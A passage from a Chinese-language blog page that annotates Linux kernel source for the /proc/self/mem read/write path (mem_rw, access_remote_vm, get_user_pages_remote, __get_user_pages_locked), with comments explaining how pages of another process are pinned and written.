class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_rw</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-comment">//要读/写的文件</span></span><br><span class="hljs-params">                      <span class="hljs-type">char</span> __user *buf, <span class="hljs-comment">//用户空间缓冲区</span></span><br><span class="hljs-params"><span class="hljs-type">size_t</span> count,    <span class="hljs-comment">//读/写长度</span></span><br><span class="hljs-params">                      <span class="hljs-type">loff_t</span> *ppos,  <span class="hljs-comment">//开始的地方</span></span><br><span class="hljs-params">                      <span class="hljs-type">int</span> write)</span> <span class="hljs-comment">//读/写</span><br>&#123;<br>    <span class="hljs-comment">//根据/proc/self/mem这个文件对象的私有数据区域, 找到其映射的是哪一个虚拟地址空间, 然后在内核中申请了一个临时页作为内核缓冲区</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> file-&gt;private_data;<span class="hljs-comment">//mem文件的私有数据区域指向对应的虚拟内存空间</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = *ppos;<span class="hljs-comment">//偏移，mm中要读写的地址</span><br><span class="hljs-type">ssize_t</span> copied;<br><span class="hljs-type">char</span> *page;<br><br><span class="hljs-keyword">if</span> (!mm)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>page = (<span class="hljs-type">char</span> *)__get_free_page(GFP_TEMPORARY);<span class="hljs-comment">//获取一个临时页，sys_write限制最多写一页</span><br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>copied = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))<span class="hljs-comment">//增加一个引用</span><br><span class="hljs-keyword">goto</span> <span class="hljs-built_in">free</span>;<br><span class="hljs-comment">//通过一个循环写入count长数据, copy_from_user把数据搬运到内核缓冲区中, 再调用access_remote_vm()写入虚拟地址空间中</span><br><span class="hljs-keyword">while</span> (count &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//count表示剩余要写入的长度</span><br><span class="hljs-type">int</span> this_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">int</span>, count, PAGE_SIZE);<span class="hljs-comment">//本次写入多少</span><br><span class="hljs-comment">//把data从用户空间buf复制到内核的临时页</span><br><span class="hljs-keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;<br>copied = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//读写别人的虚拟地址空间</span><br>this_len = access_remote_vm(mm, addr, page, this_len, write);<br><span class="hljs-keyword">if</span> (!this_len) &#123;<br><span class="hljs-keyword">if</span> (!copied)<br>copied = -EIO;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//读取，把内核读到的数据复制到用户buf</span><br><span class="hljs-keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;<br>copied = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>buf += this_len;<span class="hljs-comment">//用户缓冲区</span><br>addr += this_len;<span class="hljs-comment">//读写地址</span><br>copied += this_len;<span class="hljs-comment">//读写了多少字节</span><br>count -= this_len;<span class="hljs-comment">//还剩多少字节</span><br>&#125;<br>*ppos = addr;<br><br>mmput(mm);<br><span class="hljs-built_in">free</span>:<br>free_page((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page);<br><span class="hljs-keyword">return</span> copied;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>access_remote_vm()</code>是对<code>__access_remote_vm</code>的包装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">access_remote_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span><br><span class="hljs-params"><span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)</span><br>&#123;<br><span class="hljs-keyword">return</span> __access_remote_vm(<span class="hljs-literal">NULL</span>, mm, addr, buf, len, write);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="__access_remote_vm()"></a>__access_remote_vm()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span><br><span class="hljs-comment"> * given task for page fault accounting.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//访问mm指向的其他进程的地址空间，如果tsk非NULL，则用来进行缺页异常计数</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-type">void</span> *old_buf = buf;<br><br>down_read(&amp;mm-&gt;mmap_sem);<span class="hljs-comment">//获取mmap_sem信号量</span><br><span class="hljs-comment">/* ignore errors, just check how much was successfully transferred */</span><br><span class="hljs-keyword">while</span> (len) &#123;<span class="hljs-comment">//循环，直到写入len长度</span><br><span class="hljs-type">int</span> bytes, ret, offset;<br><span class="hljs-type">void</span> *maddr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//把要访问的其他进程的页面锁定在内存中，避免缺页异常，这里只获取1页，page就是锁定的那一页</span><br>ret = get_user_pages_remote(tsk, mm, addr, <span class="hljs-number">1</span>,<br>write, <span class="hljs-number">1</span>, &amp;page, &amp;vma);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check if this is a VM_IO | VM_PFNMAP VMA, which</span><br><span class="hljs-comment"> * we can access using slightly different code.</span><br><span class="hljs-comment"> */</span><br>vma = find_vma(mm, addr);<br><span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)<br>ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,<br>  len, write);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>bytes = ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>bytes = len;<span class="hljs-comment">//要写入的长度</span><br>offset = addr &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<span class="hljs-comment">//addr的页内偏移</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            bytes+offset &lt;= PAGE_SIZE</span><br><span class="hljs-comment">            =&gt;写入长度+页内偏移&lt;=PAGE_SIZE</span><br><span class="hljs-comment">            =&gt;锁定是页为单位的，因此不能跨页写入</span><br><span class="hljs-comment">            */</span><br><span class="hljs-keyword">if</span> (bytes &gt; PAGE_SIZE-offset)<br>bytes = PAGE_SIZE-offset;<br><span class="hljs-comment">//此时的page为get_user_pages_remote()为用户寻找的，是被锁定在内存中的页，kmap将其映射在内核地址空间中</span><br>maddr = kmap(page);<br><span class="hljs-keyword">if</span> (write) &#123;<span class="hljs-comment">//写入请求</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                先调用copy_to_user_page()进行写入</span><br><span class="hljs-comment">                maddr为根据addr锁定的页，offset为addr额页内偏移，两者相加就是要写入的地址</span><br><span class="hljs-comment">                等价为：memcpy(maddr + offset, buf, bytes)</span><br><span class="hljs-comment">                */</span><br>copy_to_user_page(vma, page, addr,<br>  maddr + offset, buf, bytes);<br>                <span class="hljs-comment">//标记为脏页</span><br>set_page_dirty_lock(page);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//等价：memcpy(buf, maddr+offset, bytes)</span><br>copy_from_user_page(vma, page, addr,<br>    buf, maddr + offset, bytes);<br>&#125;<br>kunmap(page);<br>put_page(page);<span class="hljs-comment">//释放</span><br>&#125;<br>len -= bytes;<br>buf += bytes;<br>addr += bytes;<br>&#125;<br>up_read(&amp;mm-&gt;mmap_sem);<br><br><span class="hljs-keyword">return</span> buf - old_buf;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个函数的核心就在与怎么把别的进程的页面锁定在内存中的, 因此<code>get_user_pages_remote()</code>是<code>__access_remote_vm()</code>的核心函数</p><h4 id="get-user-pages-remote"><a href="#get-user-pages-remote" class="headerlink" title="get_user_pages_remote()"></a>get_user_pages_remote()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_user_pages_remote() - pin user pages in memory</span><br><span class="hljs-comment"> * @tsk:the task_struct to use for page fault accounting, or</span><br><span class="hljs-comment"> *NULL if faults are not to be recorded.</span><br><span class="hljs-comment"> * @mm:mm_struct of target mm</span><br><span class="hljs-comment"> * @start:starting user address</span><br><span class="hljs-comment"> * @nr_pages:number of pages from start to pin</span><br><span class="hljs-comment"> * @write:whether pages will be written to by the caller</span><br><span class="hljs-comment"> * @force:whether to force access even when user mapping is currently</span><br><span class="hljs-comment"> *protected (but never forces write access to shared mapping).</span><br><span class="hljs-comment"> * @pages:array that receives pointers to the pages pinned.</span><br><span class="hljs-comment"> *Should be at least nr_pages long. Or NULL, if caller</span><br><span class="hljs-comment"> *only intends to ensure the pages are faulted in.</span><br><span class="hljs-comment"> * @vmas:array of pointers to vmas corresponding to each page.</span><br><span class="hljs-comment"> *Or NULL if the caller does not require them.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns number of pages pinned. This may be fewer than the number</span><br><span class="hljs-comment"> * requested. If nr_pages is 0 or negative, returns 0. If no pages</span><br><span class="hljs-comment"> * were pinned, returns -errno. Each page returned must be released</span><br><span class="hljs-comment"> * with a put_page() call when it is finished with. vmas will only</span><br><span class="hljs-comment"> * remain valid while mmap_sem is held.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with mmap_sem held for read or write.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages walks a process&#x27;s page tables and takes a reference to</span><br><span class="hljs-comment"> * each struct page that each user address corresponds to at a given</span><br><span class="hljs-comment"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="hljs-comment"> * thread accesses the given user virtual address at that instant.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This does not guarantee that the page exists in the user mappings when</span><br><span class="hljs-comment"> * get_user_pages returns, and there may even be a completely different</span><br><span class="hljs-comment"> * page there in some cases (eg. if mmapped pagecache has been invalidated</span><br><span class="hljs-comment"> * and subsequently re faulted). However it does guarantee that the page</span><br><span class="hljs-comment"> * won&#x27;t be freed completely. And mostly callers simply care that the page</span><br><span class="hljs-comment"> * contains data that was valid *at some point in time*. Typically, an IO</span><br><span class="hljs-comment"> * or similar operation cannot guarantee anything stronger anyway because</span><br><span class="hljs-comment"> * locks can&#x27;t be held over the syscall boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If write=0, the page must not be written to. If the page is written to,</span><br><span class="hljs-comment"> * set_page_dirty (or set_page_dirty_lock, as appropriate) must be called</span><br><span class="hljs-comment"> * after the page is finished with, and before put_page is called.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages is typically used for fewer-copy IO operations, to get a</span><br><span class="hljs-comment"> * handle on the memory by some means other than accesses via the user virtual</span><br><span class="hljs-comment"> * addresses. The pages may be submitted for DMA to devices or accessed via</span><br><span class="hljs-comment"> * their kernel linear mapping (via the kmap APIs). Care should be taken to</span><br><span class="hljs-comment"> * use the correct cache flushing APIs.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See also get_user_pages_fast, for performance critical applications.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages should be phased out in favor of</span><br><span class="hljs-comment"> * get_user_pages_locked|unlocked or get_user_pages_fast. Nothing</span><br><span class="hljs-comment"> * should use get_user_pages because it cannot pass</span><br><span class="hljs-comment"> * FAULT_FLAG_ALLOW_RETRY to handle_mm_fault.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">get_user_pages_remote()-把用户页面锁定在内存中</span><br><span class="hljs-comment">@tsk：用于进行缺页异常计数的任务描述符，如果是NULL的话就不进行记数</span><br><span class="hljs-comment">@mm：目标虚拟内存空间</span><br><span class="hljs-comment">@start：起始用户地址</span><br><span class="hljs-comment">@nr_pages：从start开始要锁定多少页面</span><br><span class="hljs-comment">@write：这些要锁定的页面是否需要被写入</span><br><span class="hljs-comment">@force：当用户映射正在被保护时，用于存放指向被锁定的pages的指针</span><br><span class="hljs-comment">@vms：一个VMA指针数组，用于存放每一个页面对应的VMA对象</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">返回被锁定的页面数量，有可能比请求的少，如果是0或者负数，就表示出错了</span><br><span class="hljs-comment">pages中返回的每一个页面都必须通过put_page()进行释放</span><br><span class="hljs-comment">vmas中的指针会一直有效，直到mmap_sem被释放</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_user_pages_remote</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,</span><br><span class="hljs-params"><span class="hljs-type">int</span> write, <span class="hljs-type">int</span> force, <span class="hljs-keyword">struct</span> page **pages,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> vm_area_struct **vmas)</span><br>&#123;<br><span class="hljs-keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, write, force,<br>       pages, vmas, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>,<br>       FOLL_TOUCH | FOLL_REMOTE);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>get_user_pages_remote()</code>是对<code>__get_user_pages_locked()</code>的包装</p><h4 id="get-user-pages-locked"><a href="#get-user-pages-locked" class="headerlink" title="__get_user_pages_locked()"></a>__get_user_pages_locked()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">long</span> __get_user_pages_locked(<span class="hljs-keyword">struct</span> task_struct *tsk,<span class="hljs-comment">//进行缺页计数的</span><br><span class="hljs-keyword">struct</span> mm_struct *mm,<span class="hljs-comment">//目标虚拟内存地址</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,<span class="hljs-comment">//起始地址</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<span class="hljs-comment">//锁定多少页</span><br><span class="hljs-type">int</span> write,    <span class="hljs-comment">//是否需要写入</span><br>                          <span class="hljs-type">int</span> force, <span class="hljs-comment">//是否强制锁定</span><br><span class="hljs-keyword">struct</span> page **pages,    <span class="hljs-comment">//锁定页面的指针数组</span><br><span class="hljs-keyword">struct</span> vm_area_struct **vmas,<span class="hljs-comment">//被锁定页面对应的VMA数组指针</span><br><span class="hljs-type">int</span> *locked, <span class="hljs-comment">//是否使用VM_FAULT_RETRY的功能，设为NULL</span><br>                          <span class="hljs-type">bool</span> notify_drop,   <span class="hljs-comment">//不进行通知，设为false</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<span class="hljs-comment">//标志</span><br>&#123;<br><span class="hljs-type">long</span> ret, pages_done;<br><span class="hljs-type">bool</span> lock_dropped;<br><br><span class="hljs-keyword">if</span> (locked) &#123;<br><span class="hljs-comment">/* if VM_FAULT_RETRY can be returned, vmas become invalid */</span><br>BUG_ON(vmas);<br><span class="hljs-comment">/* check caller initialized locked */</span><br>BUG_ON(*locked != <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (pages)<span class="hljs-comment">//如果需要获取页面，设置FILL_GET标志</span><br>flags |= FOLL_GET;<br><span class="hljs-keyword">if</span> (write)<span class="hljs-comment">//如果需要写入，设置FOLL_WRITE标志</span><br>flags |= FOLL_WRITE;<br><span class="hljs-keyword">if</span> (force)<span class="hljs-comment">//是否强制锁定</span><br>flags |= FOLL_FORCE;<br><br>pages_done = <span class="hljs-number">0</span>;<br>lock_dropped = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">for</span> (;;) &#123;<br>ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,<br>       vmas, locked);<br><span class="hljs-keyword">if</span> (!locked)<span class="hljs-comment">//如果VM_FAULT_RETRY无法触发，就直接返回</span><br><span class="hljs-comment">/* VM_FAULT_RETRY couldn&#x27;t trigger, bypass */</span><br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-comment">/* VM_FAULT_RETRY cannot return errors */</span><br><span class="hljs-keyword">if</span> (!*locked) &#123;<br>BUG_ON(ret &lt; <span class="hljs-number">0</span>);<br>BUG_ON(ret &gt;= nr_pages);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!pages)<br><span class="hljs-comment">/* If it&#x27;s a prefault don&#x27;t insist harder */</span><br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>nr_pages -= ret;<br>pages_done += ret;<br><span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (*locked) &#123;<br><span class="hljs-comment">/* VM_FAULT_RETRY didn&#x27;t trigger */</span><br><span class="hljs-keyword">if</span> (!pages_done)<br>pages_done = ret;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">/* VM_FAULT_RETRY triggered, so seek to the faulting offset */</span><br>pages += ret;<br>start += ret &lt;&lt; PAGE_SHIFT;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Repeat on the address that fired VM_FAULT_RETRY</span><br><span class="hljs-comment"> * without FAULT_FLAG_ALLOW_RETRY but with</span><br><span class="hljs-comment"> * FAULT_FLAG_TRIED.</span><br><span class="hljs-comment"> */</span><br>*locked = <span class="hljs-number">1</span>;<br>lock_dropped = <span class="hljs-literal">true</span>;<br>down_read(&amp;mm-&gt;mmap_sem);<br>ret = __get_user_pages(tsk, mm, start, <span class="hljs-number">1</span>, flags | FOLL_TRIED,<br>       pages, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (ret != <span class="hljs-number">1</span>) &#123;<br>BUG_ON(ret &gt; <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!pages_done)<br>pages_done = ret;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>nr_pages--;<br>pages_done++;<br><span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-keyword">break</span>;<br>pages++;<br>start += PAGE_SIZE;<br>&#125;<br><span class="hljs-keyword">if</span> (notify_drop &amp;&amp; lock_dropped &amp;&amp; *locked) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We must let the caller know we temporarily dropped the lock</span><br><span class="hljs-comment"> * and so the critical section protected by it was lost.</span><br><span class="hljs-comment"> */</span><br>up_read(&amp;mm-&gt;mmap_sem);<br>*locked = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> pages_done;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用到<code>__get_user_pages()</code></p><h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages()"></a>__get_user_pages()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 